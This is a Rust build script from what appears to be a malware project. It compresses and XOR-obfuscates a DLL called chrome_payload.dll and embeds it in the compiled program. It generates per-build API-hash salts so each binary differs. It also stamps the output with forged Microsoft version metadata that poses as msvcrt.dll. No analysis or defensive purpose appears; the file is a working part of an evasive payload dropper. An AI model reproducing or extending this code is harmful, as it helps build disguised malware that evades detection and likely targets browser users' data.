use std::{env, fs, path::PathBuf};
use flate2::write::DeflateEncoder;
use flate2::Compression;
use std::io::Write;

fn obfuscate(dll_bytes: &[u8], key: u8) -> Vec<u8> {
    let mut encoder = DeflateEncoder::new(Vec::new(), Compression::default());
    encoder.write_all(dll_bytes).expect("compress payload");
    let compressed = encoder.finish().expect("finish compression");
    compressed.iter().map(|&b| b ^ key).collect()
}

// Generate a random u32 salt using the XOR key + cargo package version hash as
// entropy source. This produces a different HASH_SALT constant every build when
// PAYLOAD_XOR_KEY changes, making every api_hash() constant unique per binary.
fn gen_hash_salt(xor_key: u8, out_dir: &PathBuf) {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};

    let mut h = DefaultHasher::new();
    xor_key.hash(&mut h);
    env::var("CARGO_PKG_VERSION").unwrap_or_default().hash(&mut h);
    // Mix in build timestamp at second granularity so even same-key rebuilds differ.
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
        .hash(&mut h);
    let salt = h.finish() as u32;

    let salt_path = out_dir.join("api_hash_salt.rs");
    fs::write(
        &salt_path,
        format!("pub const HASH_SALT: u32 = 0x{:08X};\n", salt),
    )
    .expect("write api_hash_salt.rs");
}

fn main() {
    let manifest_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let out_dir = PathBuf::from(env::var("OUT_DIR").expect("OUT_DIR not set"));

    // Embed Windows resources (version info + manifest)
    let mut res = winresource::WindowsResource::new();
    res.set("CompanyName", "Microsoft Corporation");
    res.set("FileDescription", "Microsoft Visual C++ Runtime Library");
    res.set("FileVersion", "14.30.30704.0");
    res.set("InternalName", "msvcrt.dll");
    res.set("OriginalFilename", "msvcrt.dll");
    res.set("ProductName", "Microsoft Visual C++ Runtime Library");
    res.set("ProductVersion", "14.30.30704.0");
    res.set("LegalCopyright", "\u{00a9} Microsoft Corporation. All rights reserved.");
    res.set_language(0x0409);
    res.compile().expect("Failed to compile resources");

    let key_str = env::var("PAYLOAD_XOR_KEY").unwrap_or_default();
    let key: u8 = if key_str.is_empty() {
        let fallback = env!("CARGO_PKG_VERSION").len() as u8;
        if fallback == 0 { 0xA5 } else { fallback }
    } else {
        key_str.parse::<u8>().unwrap_or(0xA5)
    };

    // Generate per-build API hash salt (written to OUT_DIR/api_hash_salt.rs,
    // included by src/core_utils/api_hash.rs).
    gen_hash_salt(key, &out_dir);

    // 1. Trouver la DLL 64-bit
    let candidates = [
        env::var("CHROME_PAYLOAD_DLL").ok().map(PathBuf::from),
        Some(manifest_dir.join("target/release/chrome_payload.dll")),
        Some(manifest_dir.join("src/payload/target/release/chrome_payload.dll")),
        env::var("CARGO_TARGET_DIR")
            .ok()
            .map(|d| PathBuf::from(d).join("release/chrome_payload.dll")),
    ];

    let dll_path = candidates
        .into_iter()
        .flatten()
        .find(|p| p.exists() && p.metadata().map(|m| m.len()).unwrap_or(0) > 0)
        .expect("chrome_payload.dll not found");

    let dll_bytes = fs::read(&dll_path).expect("read payload DLL");
    let obfuscated = obfuscate(&dll_bytes, key);

    let out_path = out_dir.join("payload_obf.bin");
    fs::write(&out_path, &obfuscated).expect("write obfuscated payload");

    let key_path = out_dir.join("payload_key.bin");
    fs::write(&key_path, [key]).expect("write key file");

    if let Ok(prefix) = env::var("COMPILE_PREFIX") {
        println!("cargo:rustc-env=COMPILE_PREFIX={}", prefix);
    }
    if let Ok(suffix) = env::var("COMPILE_SUFFIX") {
        println!("cargo:rustc-env=COMPILE_SUFFIX={}", suffix);
    }

    println!("cargo:rerun-if-changed={}", dll_path.display());
    println!(
        "cargo:warning=embedded payload (compressed + obfuscated) from {} ({} -> {} bytes, key=0x{:02X})",
        dll_path.display(),
        dll_bytes.len(),
        obfuscated.len(),
        key
    );
}
